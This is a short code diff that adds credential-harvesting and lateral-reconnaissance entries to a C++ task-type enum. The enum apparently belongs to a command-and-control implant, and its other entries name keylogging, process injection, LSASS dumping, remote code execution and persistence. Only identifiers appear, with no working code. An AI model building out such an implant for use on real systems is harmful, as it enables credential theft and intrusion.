@@ -22,6 +22,7 @@ enum class TaskType {
     KEYLOG,
     INJECT,
     SYSINFO,
+    SYS_CRED_HARVEST,
     DEEP_RECON,
     BROWSE_FS,
     EXECUTE_ASSEMBLY,
@@ -29,6 +30,7 @@ enum class TaskType {
     ADV_PERSISTENCE,
     DUMP_LSASS,
     LATERAL_RCE,
+    LATERAL_RECON,
     LATERAL_WIRELESS,
     GET_LOGS,
     UNKNOWN // For tasks that don't map to a known type
